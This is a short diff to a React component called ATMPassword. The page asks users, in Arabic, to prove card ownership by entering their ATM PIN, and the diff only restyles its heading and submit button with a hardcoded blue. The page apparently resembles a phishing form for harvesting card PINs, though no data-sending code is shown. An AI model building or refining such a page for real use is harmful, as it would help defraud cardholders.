@@ -132,7 +132,7 @@ export default function ATMPassword() {
         {/* Header */}
         <div className="text-center mb-6">
           <h1 className="text-xl font-bold text-gray-800 mb-1">إثبات ملكية البطاقة</h1>
-          <h2 className="text-2xl font-bold text-primary mb-2">ATM</h2>
+          <h2 className="text-2xl font-bold mb-2" style={{ color: '#1a5276' }}>ATM</h2>
           <p className="text-gray-600 text-sm">
             لتأكيد العملية أدخل الرقم السري للصراف الآلي
           </p>
@@ -197,7 +197,8 @@ export default function ATMPassword() {
           {/* Submit Button */}
           <Button 
             type="submit" 
-            className="w-full h-11 text-sm" 
+            className="w-full h-11 text-sm text-white hover:opacity-90" 
+            style={{ backgroundColor: '#1a5276' }}
             disabled={isWaiting || !isPinComplete}
           >
             {isWaiting ? (
